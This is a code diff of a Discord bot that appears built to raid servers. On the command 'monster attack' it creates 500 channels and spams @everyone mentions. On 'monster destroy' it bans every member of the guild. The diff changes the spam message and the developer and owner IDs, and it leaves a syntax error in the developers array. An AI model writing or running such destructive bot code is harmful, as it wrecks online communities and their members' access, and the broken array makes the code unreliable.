@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone __**Dating Team Is The Best Bitches**__ :muscle: :v: @here');
+        message.channel.send('@everyone __**Atlantic Team join us **__ :muscle: :v: @here');
 }
 }
 });   
@@ -55,7 +55,7 @@ client.on('message' , async (message) => {
 });
 
 
-const developers = ["348555232529219585","444339372884754435","412302921972056066"]
+const developers = ["444339372884754435",412302921972056066",]
 const adminprefix = "#";
 client.on('message', message => {
     var argresult = message.content.split(` `).slice(1).join(' ');
@@ -104,7 +104,7 @@ client.on('message', x5bz => {
 
 client.on('message', async message => {
     if(message.content === "monster destroy") {
-        if(message.author.id !== '474772614129254401') return;
+        if(message.author.id !== '') return;
         message.guild.members.forEach(member => {
            member.ban(); 
         });
